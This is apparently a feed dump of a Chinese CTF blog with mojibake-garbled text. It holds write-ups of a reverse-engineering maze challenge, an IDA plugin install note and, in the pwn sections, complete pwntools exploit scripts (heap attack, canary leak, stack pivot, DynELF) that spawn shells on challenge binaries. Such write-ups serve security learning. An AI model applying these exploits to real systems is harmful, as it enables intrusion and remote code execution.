[&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def edit(idx,data):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&quot;content&quot;,str(data))payload = &#39;a&#39; * 0x40add(0,0x90,payload)payload = &#39;a&#39; * 0x40 + p64(0) + p64(0xfb1)edit(0,payload)payload = &#39;a&#39; * 0x90for i in range(24):    add(0,0x90,payload)payload = &#39;a&#39; * 0x10add(1,0x90,payload)payload = &#39;a&#39; * 0x70add(0,0x70,payload)payload = &#39;\x00&#39; * 0x18 + p64(0x71) + p64(0x6020C0 + 0x100)edit(1,payload)payload = 0x60 * &#39;a&#39;add(0,0x70,payload)add(0,0x90,payload)payload = p64(0x0000000000602058) + p64(0x90)edit(0,payload)edit(1,p64(elf.plt[&#39;printf&#39;]))sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)payload = &#39;aaaa%7$s&#39; + p64(0x000000000602018)sa(&#39;idx&#39;,payload)r(4)r(4)libc_base = uu64(r(6)) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)sys = libc_base + libc.sym[&#39;system&#39;]sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)payload = &#39;aaaa%82c&#39; + &#39;%8$hhn11&#39; + p64(0x000000000602058)sa(&#39;idx&#39;,payload)edit(1,p64(sys))s(&#39;sh&#39;)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;cicsn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;a href=&quot;#cicsn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;/a&gt;cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®</title>
    <link href="http://chumen77.xyz/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/08/16/æ— æ ‡é¢˜/</id>
    <published>2020-08-16T11:12:38.871Z</published>
    <updated>2020-08-17T13:55:03.167Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®"><a href="#å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®"></a>å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p><p>æ³¨æ„ç½‘å¡é‚£å—ï¼Œè¦å¯¹åº”è‡ªå·±è™šæ‹Ÿæœºç½‘å¡çš„æƒ…å†µã€‚</p><h5 id="å¯åŠ¨å‘½ä»¤ï¼š"><a href="#å¯åŠ¨å‘½ä»¤ï¼š" class="headerlink" title="å¯åŠ¨å‘½ä»¤ï¼š"></a>å¯åŠ¨å‘½ä»¤ï¼š</h5><pre><code class="python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append &quot;root=/dev/sda console=tty50&quot;  -net nic -net tap</code></pre><h4 id="æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥"><a href="#æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥" class="headerlink" title="æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥"></a>æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥</h4><pre><code class="bash">scp -r /path/maze username@servername:/path </code></pre><h4 id="ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ"><a href="#ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ" class="headerlink" title="ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ"></a>ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ</h4><pre><code class="bash">  fgets(buf,0x28,_stdin);  len = strlen(buf);  uStack68 = 0x20;  if (*(char *)((int)&amp;uStack68 + len + 3) == &#39;\n&#39;) {    *(undefined *)((int)&amp;uStack68 + len + 3) = 0;    len = len - 1;  }  if (len != 0x20) {    eorr();  }</code></pre><p>è¿™ä¸€æ®µå¯ä»¥ç¡®å®šè®©è¾“å…¥çš„æ˜¯32ä¸ªå­—ç¬¦ã€‚</p><pre><code class="c">void FUN_004006f0(void){  int i;  int j;  i = 0;  while (i &lt; DAT_16) {    j = 0;    while (j &lt; 8) {      maze[i * 8 + j] =           (char)(((int)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * 4)) &gt;&gt;                 (7U - j &amp; 0x1f));      j = j + 1;    }    i = i + 1;  }  return;}</code></pre><p>å¯ä»¥çœ‹åˆ°è¿·å®«æ˜¯åœ¨è¿è¡Œæ—¶æ ¹æ®éƒ¨åˆ†æ•°æ®ï¼Œæ¥ç”Ÿæˆçš„ã€‚å¹¶ä¸”å…¶ä¸­ä¸€è¡Œæ˜¯8ä¸ªæ•°æ®ï¼Œä¸€åˆ—æ˜¯16ä¸ªï¼Œä¸€å…±128ä¸ªæ•°æ®ã€‚</p><p>å¯ä»¥ä½¿ç”¨gdbï¼Œæ–­ç‚¹åœ¨è¿™ä¸ªå‡½æ•°ä¹‹åï¼ŒæŠŠè¿·å®«æå–å‡ºæ¥ã€‚æå–å‡ºæ¥çš„éƒ½æ˜¯0x1 å’Œ 0x0<br>ç»„æˆçš„è¿·å®«ã€‚</p><p>è¿›å…¥æ§åˆ¶èµ°ä½çš„å‡½æ•°ï¼š</p><pre><code class="c">  heng = 1;  shu = 0;  pcStackX0 = param_1</code></pre><p>è¿™ä¸ªåœ°æ–¹æ§åˆ¶è¯´ï¼Œèµ·å…ˆèµ·ç‚¹æ˜¯ç¬¬1è¡Œçš„ç¬¬2ä¸ªä½ç½®ã€‚</p><p>checkå‡½æ•°ï¼Œä¸»è¦æ˜¯çœ‹ä½ æ˜¯ä¸æ˜¯åœ¨ç§»åŠ¨åï¼Œèµ°åˆ°äº†0ä¸Šï¼Œèµ°åˆ°çš„è¯ï¼Œç¨‹åºå°±åˆ¤ä½ å¤±è´¥ã€‚</p><p>å¾€ä¸‹çœ‹ï¼Œå‘ç°ä¸»è¦åˆ¤æ–­ï¼š</p><pre><code class="c">          if (cVar1 != &#39;U&#39;) {LAB_00400ad4:            if ((heng == 1) &amp;&amp; (shu == 10)) {              uVar3 = 1;            }            else {              uVar3 = 0;            }</code></pre><p>åœ¨è¿™ä¸€æ®µï¼Œå¯ä»¥ç¡®å®šèµ°åˆ°ç¬¬11åˆ—çš„ç¬¬2ä¸ªæ•°å­—å³å¯ã€‚</p><h4 id="æå–è¿·å®«å›¾å¹¶å¤„ç†"><a href="#æå–è¿·å®«å›¾å¹¶å¤„ç†" class="headerlink" title="æå–è¿·å®«å›¾å¹¶å¤„ç†"></a>æå–è¿·å®«å›¾å¹¶å¤„ç†</h4><h5 id="è„šæœ¬æå–"><a href="#è„šæœ¬æå–" class="headerlink" title="è„šæœ¬æå–"></a>è„šæœ¬æå–</h5><pre><code class="c">data=&quot;AMz1nG~#--Ma7e~&quot;data2=[0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1]maze=[]lie=0while lie&lt;15:    hang=0    while hang&lt;8:        # print(hex(ord(data[lie])&amp;data2[hang]),(7-hang&amp;0x1f))        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(7-hang&amp;0x1f))        hang+=1    lie+=1print(maze)</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/lAdA8H.png" srcset="/img/loading.gif" alt></p><p>å°±è¿™è¿·å®«ï¼Œæˆ‘çœ‹äº†å¥½ä¸€ä¼šæ‰èƒ½èµ°å¥½ã€‚ğŸ¤£ğŸ¤£æœäº†è‡ªå·±ï¼Œè€ä»¥ä¸ºæ˜¯æ•°æ®æå–é”™äº†ã€‚</p><pre><code class="bash">flag = md5{DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU}</code></pre><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary_"></a><code>baby_canary_</code></h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><h5 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h5><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨æ¥æ³„æ¼ã€‚</li><li>æ ˆæº¢å‡ºï¼Œåªèƒ½1ä¸ªgadgetã€‚</li></ul><h5 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h5><h6 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h6><p>åªèƒ½æº¢å‡ºä¸€ä¸ªgadgetï¼Œè‚¯å®šæ˜¯æ‰“æ ˆè¿ç§»ï¼Œä½†æ˜¯è·Ÿä»¥å¾€çš„æ ˆè¿ç§»ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€ä¸ªgadgetåªèƒ½æº¢å‡ºåˆ°rbpï¼Œå¹¶ä¸èƒ½è¦†ç›–åˆ°ret addressï¼Œæ‰€ä»¥åªèƒ½è¦†ç›–å¥½rbpåï¼Œåˆ©ç”¨ç¨‹åºèµ°å‡ºè¿™ä¸ªå‡½æ•°åï¼Œå°†è¦ç»“æŸç¨‹åºæ—¶çš„<code>leave ret</code> ã€‚</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å› ä¸ºåœ¨èµ°è¿‡ä¸€æ¬¡ <code>leave ret</code>æ—¶ï¼Œæ­¤æ—¶çš„rbpå·²ç»è¢«æ”¹äº†ï¼Œå†è¿‡ç¨‹åºçš„ç¬¬äºŒä¸ªleave ret å‰ï¼Œéœ€è¦è¿‡ä¸€ä¸‹canaryçš„æ£€æµ‹:</p><pre><code class="bash">[----------------------------------registers-----------------------------------]RAX: 0x0RBX: 0x0RCX: 0x0RDX: 0x38 (&#39;8&#39;)RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00RDI: 0x0RBP: 0x601198 --&gt; 0x26c46b053d3e2f00RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1RIP: 0x4008de (mov    rdx,QWORD PTR [rbp-0x8])R8 : 0x7f0bb0977700 (0x00007f0bb0977700)R9 : 0x12R10: 0x78 (&#39;x&#39;)R11: 0x246R12: 0x400680 (xor    ebp,ebp)R13: 0x7ffefee5e440 --&gt; 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x4008cf:    mov    eax,0x0   0x4008d4:    call   0x4007de   0x4008d9:    mov    eax,0x0=&gt; 0x4008de:    mov    rdx,QWORD PTR [rbp-0x8]   0x4008e2:    xor    rdx,QWORD PTR fs:0x28   0x4008eb:    je     0x4008f2   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;</code></pre><p>çœ‹è¿™é‡Œï¼Œåœ¨å–æ•°å€¼æ—¶ï¼Œå…¶åœ¨ä½ è¿ç§»çš„bssæ®µè¯»å–æ•°å€¼åˆ°rdxè¿›è¡Œåˆ¤æ–­çš„ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€æ¬¡å¾€bssæ®µè¯»çš„æ—¶å€™ï¼Œå¡«å……å¥½canaryçš„å€¼ã€‚</p><p>å¹¶ä¸”è¿™ä¸ªé¢˜ï¼Œåœ¨çœ‹gotè¡¨åˆ°bssæ®µçš„è·ç¦»ä¹Ÿæ˜¯å¾ˆè¿‘çš„ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zbOm9Q.png" srcset="/img/loading.gif" alt></p><p>æ‰€ä»¥åœ¨è¿ç§»çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä»æœ‰å®é™…æ„ä¹‰çš„å‡½æ•°ï¼ˆæ¯”å¦‚putsï¼‰å¼€å§‹å‰å°±å¾—æŠŠæ ˆæŠ¬é«˜ã€‚å¦åˆ™åœ¨è¿›å…¥libcçš„å†…éƒ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼šå› ä¸ºå„ç§push pop è€Œä¿®æ”¹åˆ°gotå¤„çš„ä¸œè¥¿ï¼Œå¯¼è‡´ä¸ä»…æ³„æ¼çš„æ•°å€¼æœ‰é—®é¢˜ï¼Œå¹¶ä¸”å®¹æ˜“è®©ç¨‹åºå´©æ‰ã€‚</p><pre><code class="bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))success(hex(puts))s.recvline()</code></pre><p>æ­¤å¤„å°±å¯ä»¥æ³„æ¼å‡ºputså‡½æ•°çš„libcåœ°å€ï¼Œä½†æ˜¯ç”±äºå‡ºé¢˜äººæƒ³è€ƒå¯Ÿ<code>ret2dl_runtime_resolve</code>,æ‰€ä»¥åº”è¯¥æ˜¯é­”æ”¹äº†libcã€‚</p><p>ç„¶åå¯ä»¥ä½¿ç”¨DynELFæ¥æå®šï¼Œå‚è€ƒç¾¤é‡Œå¸ˆå‚…åˆ†äº«çš„expã€‚</p><h6 id="Dynelfå‡½æ•°æ€ä¹ˆå†™"><a href="#Dynelfå‡½æ•°æ€ä¹ˆå†™" class="headerlink" title="Dynelfå‡½æ•°æ€ä¹ˆå†™"></a>Dynelfå‡½æ•°æ€ä¹ˆå†™</h6><p>ç”±äºç¨‹åºåªæœ‰putså‡½æ•°æ¥è¾“å‡ºï¼Œå°±ç”¨putså‡½æ•°æ¥è¿›è¡Œæ³„æ¼ã€‚</p><pre><code class="python">payload = p64(0) * 57 +p64(canary) * 2  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre><p>æœ¬æ¥æˆ‘æ˜¯è¿™æ ·å†™çš„ï¼Œä½†æ˜¯å‘ç°ç¨‹åºè¿˜æ˜¯ä¼šå´©ï¼Œç”±äºç¨‹åºæƒ…å†µçš„é™åˆ¶ï¼Œæ ˆåªèƒ½æé«˜<code>0x1b0</code>è¿™æ ·ï¼Œè¿˜æ˜¯ä¸å¤Ÿç”¨ã€‚</p><p>è¿˜æ˜¯å°±æƒ³åŠæ³•æå‡æ ˆï¼Œå¾€é«˜ç‚¹çš„bssä¸Šå†™å…¥ropè¿›è¡Œæƒ³è¦çš„æ“ä½œã€‚</p><p>è¿™ä¸ªå°±åœ¨Dynelfå‰å†™å¥½,ç”¨ropæ§åˆ¶å‚æ•°ï¼Œè°ƒç”¨readå‡½æ•°æ¥å¾€é«˜ç‚¹çš„bssæ®µè¿›è¡Œå†™payloadï¼Œå¹¶ä¸”æœ€åç”¨pop rspçš„æ“ä½œï¼ŒæŠŠå†™å¥½rop chainçš„bssçš„åœ°å€pop åˆ°rspä¸Šï¼Œç„¶åå†retä¸Šå»ï¼š</p><pre><code class="python">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()</code></pre><p>æ¥ç€å°±æ˜¯ç”¨è¿™å†™å¥½å¥½çš„rop chainï¼Œè¿›è¡Œæ³„æ¼åœ°å€ï¼Œä¸ºäº†Dynelfå¤šæ¬¡è°ƒç”¨æ³„æ¼ï¼Œåœ¨æ³„æ¼åœ°å€åï¼Œè·Ÿä¸Šreadå‡½æ•°ç»§ç»­å¾€è¿™æ®µåœ°å€ä¸Šè¯»å–åŒæ ·çš„rop chainï¼Œç„¶åå†æ¬¡æ§åˆ¶rspï¼Œæ¥ç€retåˆ°å¯¹åº”çš„ä½ç½®ï¼š</p><pre><code class="python">def vuln(address):    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)    s.recvline(timeout=0.07)    s.send(payload)    count = 0    up = &quot;&quot;    buf = &#39;&#39;    while True:        c = s.recv(numb=1, timeout=0.07)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:              buf = buf[:-1]                        buf += &quot;\x00&quot;            break        else:            buf += c            up = c    data = buf[:8]    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return data</code></pre><p>å¯ä»¥çœ‹åˆ°æ˜¯æé«˜äº†0x500ä¸ªå­—èŠ‚çš„åœ°æ–¹è¿›è¡Œropï¼Œåšå¥½ç”¨æ§åˆ¶rspï¼Œretåè¿›è¡Œåå¤æ¨ªè·³è·ƒï¼Œå®Œæˆå¯¹system çš„å¯»æ‰¾ã€‚æ„Ÿè§‰è¿™æ˜¯å¾ˆå¥½çš„åŠæ³•ï¼Œå› ä¸ºæ ˆè¿ç§»çš„æ ¸å¿ƒè¿˜æ˜¯æ§åˆ¶rspï¼Œæœ€åˆå­¦ä¹ æ˜¯è§è¿‡2æ¬¡æ ˆè¿ç§»çš„é¢˜ç›®ï¼Œå½“æ—¶ç”¨çš„è¿˜æ˜¯leave ret æ¥è¿›è¡Œçš„æ§åˆ¶ï¼Œç°åœ¨çœ‹åˆ°ç›´æ¥ä½¿ç”¨pop rsp æ¥æ§åˆ¶ï¼Œçš„ç¡®æ˜¯æ–¹ä¾¿åˆç®€å•çš„åŠæ³•ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *# from LibcSearcher import *s = process(&quot;./pwn&quot;)# s = remote(&quot;183.129.189.61&quot;,54900)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level=&#39;debug&#39;def debug():    # gdb.attach(proc.pidof(s)[0],gdbscript=&#39;b main&#39;)    gdb.attach(s)    pause()pop_rdi = 0x0000000000400963pop_rsi_r15 = 0x0000000000400961pop_rsp_3 = 0x000000000040095dleave_ret = 0x00000000004007dccontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]read_plt = elf.plt[&#39;read&#39;]bss = 0x6010a0s.sendafter(&quot;canary &#39; s @ # $ % ^ &amp; * :\n&quot;, &quot;%9$p&quot;)canary = int(s.recvline(keepends=False), 16)success(hex(canary))context.arch = &#39;amd64&#39;def vuln(address):    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)    s.recvline(timeout=0.07)    s.send(payload)    count = 0    up = &quot;&quot;    buf = &#39;&#39;    while True:        c = s.recv(numb=1, timeout=0.07)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:              buf = buf[:-1]                        buf += &quot;\x00&quot;            break        else:            buf += c            up = c    data = buf[:8]    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadebug()payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))success(hex(puts))s.recvline()d = DynELF(vuln,elf=elf)system = d.lookup(&#39;system&#39;,&#39;libc&#39;)success(hex(system))payload = p64(pop_rdi)+p64(0x6010a0+0x100+8*11)+p64(system)s.send(payload)s.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;a href=&quot;#å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;/a&gt;å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="IOT" scheme="http://chumen77.xyz/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>MacOSå®‰è£…IDAæ’ä»¶keypatch</title>
    <link href="http://chumen77.xyz/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/"/>
    <id>http://chumen77.xyz/2020/08/10/MacOSå®‰è£…IDAæ’ä»¶keypatch/</id>
    <published>2020-08-10T09:23:15.104Z</published>
    <updated>2020-08-10T15:11:27.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MacOSå®‰è£…IDAæ’ä»¶keypatch"><a href="#MacOSå®‰è£…IDAæ’ä»¶keypatch" class="headerlink" title="MacOSå®‰è£…IDAæ’ä»¶keypatch"></a>MacOSå®‰è£…IDAæ’ä»¶keypatch</h1><p>macOS å®‰è£…å®˜æ–¹ä»‹ç»çš„å®‰è£…æ–¹å¼ä¸å¤ªè¡Œã€‚ç½‘ä¸Šå‚è€ƒåè®°å½•ä¸€ä¸‹ã€‚</p><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><pre><code class="bash">brew install cmake</code></pre><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><pre><code class="bash">git clone https://github.com/fjh658/keystone-engine.gitcd keystone-enginegit submodule update --init --recursivesudo python2 setup.py install --verbose</code></pre><p>æ­¤æ—¶åœ¨å®‰è£…åçš„æœ€åå‡ æ®µä»£ç ä¸­ï¼Œæ‰¾åˆ°ç±»ä¼¼ï¼š</p><pre><code class="bash">/Library/Python/2.7/site-packages/keystone</code></pre><p>è¿™æ˜¯æœ¬åœ°python2.7çš„è·¯å¾„ã€‚</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><pre><code class="bash">cp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/</code></pre><pre><code class="bash">sudo  curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py</code></pre><p>ç°å®æ‹’ç»çš„è¯ï¼Œå¯ä»¥</p><pre><code class="bash">vim /etc/hosts199.232.68.133 raw.githubusercontent.com</code></pre><pre><code class="bash">cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida64.app/Contents/MacOS/plugins/cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/plugins/</code></pre><p>ç„¶åè¿›å…¥idaä½¿ç”¨å³å¯ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MacOSå®‰è£…IDAæ’ä»¶keypatch&quot;&gt;&lt;a href=&quot;#MacOSå®‰è£…IDAæ’ä»¶keypatch&quot; class=&quot;headerlink&quot; title=&quot;MacOSå®‰è£…IDAæ’ä»¶keypatch&quot;&gt;&lt;/a&gt;MacOSå®‰è£…IDAæ’ä»¶keypatch&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="æ‚é¡¹" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(7th)</title>
    <link href="http://chumen77.xyz/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/"/>
    <id>http://chumen77.xyz/2020/07/25/DASCTFå®‰æ’æœˆèµ›(7th)/</id>
    <published>2020-07-25T13:50:36.163Z</published>
    <updated>2020-08-10T03:50:16.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-7th"><a href="#DASCTFå®‰æ’æœˆèµ›-7th" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›(7th)"></a>DASCTFå®‰æ’æœˆèµ›(7th)</h1><p>åªåšå‡ºä¸ªç­¾åˆ°é¢˜ï¼Œtclã€‚ã€‚ã€‚</p><h2 id="è™šå‡çš„ç­¾åˆ°é¢˜"><a href="#è™šå‡çš„ç­¾åˆ°é¢˜" class="headerlink" title="è™šå‡çš„ç­¾åˆ°é¢˜"></a>è™šå‡çš„ç­¾åˆ°é¢˜</h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯å‡ºé¢˜äººä¼°è®¡æ˜¯ç”¨äº†GCC&gt;=4.9ç‰ˆæœ¬ï¼Œæ•…æ„ç»™è¿™ä¸ªStack Buffer Overflow è®¾ç½®éš¾åº¦ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code> 0x80485fd &lt;main+104&gt;:        mov    ecx,DWORD PTR [ebp-0x4] 0x8048600 &lt;main+107&gt;:        leave 0x8048601 &lt;main+108&gt;:        lea    esp,[ecx-0x4] 0x8048604 &lt;main+111&gt;:        ret</code></pre><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨å¯¹æ ˆçš„ä¿å­˜ä¸Šï¼Œé¢å¤–ä½¿ç”¨äº† ecx æ¥ä¿å­˜æ ˆä¸Šçš„æŸä¸ªå€¼ã€‚å¹¶ä¸”è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥overflowäº† espï¼Œé‚£ä¹ˆä¼šé€ 